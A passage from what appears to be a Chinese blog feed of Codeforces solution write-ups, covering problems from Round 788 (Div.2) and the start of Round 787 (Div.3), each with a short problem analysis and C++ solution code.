class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn]; </span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> num_de=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            num_de++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=num_de;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])-<span class="built_in">abs</span>(a[i<span class="number">-1</span>])&gt;<span class="number">0</span>)NO</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=num_de+<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])-<span class="built_in">abs</span>(a[i<span class="number">-1</span>])&lt;<span class="number">0</span>)NO</span><br><span class="line">    &#125;</span><br><span class="line">    OK</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Dorms-War"><a href="#B-Dorms-War" class="headerlink" title="B. Dorms War"></a>B. Dorms War</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题目题意分析了很久，后面看了很久才看出来。就是说给你一个字符串和若干个特殊字符，每次操作会使得特殊字符前面的那个字符消失，直到字符不会再消失为止，问你一共消失几次，特殊字符可以被前面的特殊字符消除。</p><p>其实不难发现，一个特殊字符吞前面字符的次数就相当于它距离最近的一个特殊字符的距离+1。多个特殊字符不影响结果，取最大即可，明明是 <code>O(n)</code> 的算法，写的时间却很高，甚至因此 <code>T</code> 了一次。以后一定要记得 <code>IO</code> 优化，拒绝 <code>cin</code>，从我做起。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn]; </span><br><span class="line"><span class="keyword">int</span> spec[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="built_in">memset</span>(spec,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(spec));</span><br><span class="line">    string tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line">        cin&gt;&gt;tmp;</span><br><span class="line">        spec[tmp[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(spec[s[i]-<span class="string">&#x27;a&#x27;</span>])&#123;</span><br><span class="line">            ans=<span class="built_in">max</span>(ans,cnt);</span><br><span class="line">            cnt=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Where-is-the-Pizza"><a href="#C-Where-is-the-Pizza" class="headerlink" title="C. Where is the Pizza?"></a>C. Where is the Pizza?</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>选择其中一个数导致了另一个必然不选，所以这里又要选另一个必选的数，然后对于每个环只有两种方案，找到环个数相乘a和b用散列保存位置。b数组全部指向a。a数组指向 自己那个值在 b 中的位置。每次判断 这个环中的位置对应的 c是否全为0。最后特判两个相等的时候这个情况也不 乘2。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],a_[maxn],b_[maxn],c[maxn],vis[maxn]; </span><br><span class="line"><span class="keyword">int</span> spec[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(pos);</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> x=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(!vis[x])&#123;</span><br><span class="line">            vis[x]=<span class="number">1</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(b_[a[x]]);</span><br><span class="line">            q.<span class="built_in">push</span>(a_[b[x]]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(c[x])&#123;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[x]==b[x])&#123;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        a_[a[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;b[i];</span><br><span class="line">        b_[b[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;c[i];    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">            <span class="keyword">int</span> res=<span class="built_in">dfs</span>(i);</span><br><span class="line">            <span class="keyword">if</span>(res)&#123;</span><br><span class="line">                ans*=<span class="number">2</span>;</span><br><span class="line">                ans%=mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Very-Suspicious"><a href="#D-Very-Suspicious" class="headerlink" title="D. Very Suspicious"></a>D. Very Suspicious</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>计算几何，自己画一下会发现：三线相交得到6个，两线相交得到2个，线只有三种方向。每添加一条线凑成三线相交，方案数+4，与其它不平行的线相交，每多一个方案数+2。然后打一遍表，把 <code>1e9</code> 以内的答案跑出来最后二分寻找答案即可。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],a_[maxn],b_[maxn],c[maxn],vis[maxn]; </span><br><span class="line"><span class="keyword">int</span> ans[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> d=<span class="built_in">lower_bound</span>(ans,ans+maxn,n)-ans;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,d);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">3</span>]=&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(ans,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(ans));</span><br><span class="line">    ans[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    ans[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    ans[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">    ans[<span class="number">3</span>]=<span class="number">6</span>;</span><br><span class="line">    ans[<span class="number">4</span>]=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span>(;cnt&lt;=<span class="number">1e9</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> sel=i%<span class="number">3</span>;</span><br><span class="line">        cnt+=(num[(sel+<span class="number">1</span>)%<span class="number">3</span>]+num[(sel+<span class="number">2</span>)%<span class="number">3</span>]<span class="number">-2</span>)*<span class="number">2</span>;</span><br><span class="line">        cnt+=<span class="number">4</span>;</span><br><span class="line">        num[sel]++;</span><br><span class="line">        ans[i+<span class="number">1</span>]=cnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这波也是上大分，上了38分，希望再接再厉，争取快点上紫。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 题解 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 787(Div.3)题解</title>
      <link href="/2022/05/06/Codeforces%20Round%20787(Div.3)/"/>
      <url>/2022/05/06/Codeforces%20Round%20787(Div.3)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1675">Codeforces Round #787 (Div. 3)</a> 题解来了。</p><p>实况在<a href="https://www.bilibili.com/video/bv1eF411j7Uz">这里</a></p><span id="more"></span><h2 id="A-Food-for-Animals"><a href="#A-Food-for-Animals" class="headerlink" title="A. Food for Animals"></a>A. Food for Animals</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你猫粮，狗粮和猫和狗都能吃的粮的个数，再给你猫狗的个数，问能否使得猫狗都有一份粮食能吃。这里我操之过急，导致WA了一发，血亏。就是说你可以先判断狗粮是否够，如果不够则通用粮食减去剩余的数目，然后在判断通用粮食和猫粮是否大于等于猫的个数就行了，但是非常要注意，通用粮食的个数不能出现负数，因为这里没判断wa了一发，很难。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">5</span>];</span><br><span class="line">    cin&gt;&gt;num[<span class="number">1</span>]&gt;&gt;num[<span class="number">2</span>]&gt;&gt;num[<span class="number">3</span>]&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    num[<span class="number">3</span>]-=<span class="built_in">max</span>(<span class="number">0</span>,x-num[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(num[<span class="number">3</span>]&lt;<span class="number">0</span>)<span class="function">NO</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    <span class="title">if</span><span class="params">(num[<span class="number">2</span>]+num[<span class="number">3</span>]&gt;=y)</span></span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Make-It-Increasing"><a href="#B-Make-It-Increasing" class="headerlink" title="B. Make It Increasing"></a>B. Make It Increasing</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你一个数组，一次操作可以让它整除2，问最后能通过最少多少次操作让序列严格递增。因为操作只会使得数字变小，那么我们不难得到，如果要让它操作次数最小，最后一个数不能动。然后依次往前，如果前面的比后面的大那就进行一次操作，直到 <code>a[i]&lt;a[i-1]||a[i]==0</code> 因为到0了整除就不会变了，因此这个条件需要加上去。</p><p>最后只需要判断第一个数和第二个数是否都为0即可。</p><h3 id="标程-1"><a 